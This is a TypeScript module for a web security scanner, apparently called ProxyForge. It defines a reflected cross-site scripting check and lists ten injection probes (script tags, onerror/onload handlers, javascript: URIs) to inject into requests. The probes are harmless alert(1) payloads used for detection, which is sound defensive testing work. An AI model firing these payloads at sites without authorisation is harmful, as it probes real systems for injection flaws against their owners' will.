// Reflected XSS active check family.
// Adapted from source-reference/vantix/secops/skills patterns.
// Rewritten in TypeScript with ProxyForge naming and types.
// No runtime dependency on vendored source.

import type { PayloadVariant } from '../types';

export const META = {
  id: 'reflected-xss',
  family: 'xss-reflected' as const,
  name: 'Reflected XSS',
  description: 'Detects reflected cross-site scripting via reflection probes.',
  defaultRisk: 'low' as const,
  insertionPointKinds: ['query', 'body', 'header', 'json', 'cookie', 'path'],
};

const XSS_PROBES = [
  { value: '<script>alert(1)</script>', intent: 'Classic script tag injection', signals: ['xss-reflected'] },
  { value: '<img src=x onerror=alert(1)>', intent: 'Img onerror event handler', signals: ['xss-reflected'] },
  { value: '"><script>alert(1)</script>', intent: 'Break attribute context then inject script', signals: ['xss-reflected'] },
  { value: "'><script>alert(1)</script>", intent: 'Break single-quote attribute context', signals: ['xss-reflected'] },
  { value: '<svg onload=alert(1)>', intent: 'SVG onload event handler — no quotes required', signals: ['xss-reflected'] },
  { value: '${alert(1)}', intent: 'Template literal expression injection', signals: ['xss-reflected'] },
  { value: 'javascript:alert(1)', intent: 'javascript: URI scheme injection', signals: ['xss-reflected'] },
  { value: '"><img src=1 onerror=alert(1)>', intent: 'Close attribute + img injection', signals: ['xss-reflected'] },
  { value: '<details open ontoggle=alert(1)>', intent: 'HTML5 ontoggle event handler', signals: ['xss-reflected'] },
  { value: '"><svg/onload=alert(1)>', intent: 'SVG with minimized attributes in attribute context', signals: ['xss-reflected'] },
];

export function variants(): PayloadVariant[] {
  return XSS_PROBES.map((probe, i) => ({
    id: `xss-${i + 1}`,
    family: 'xss-reflected' as const,
    value: probe.value,
    encoding: 'raw' as const,
    intent: probe.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: probe.signals,
  }));
}
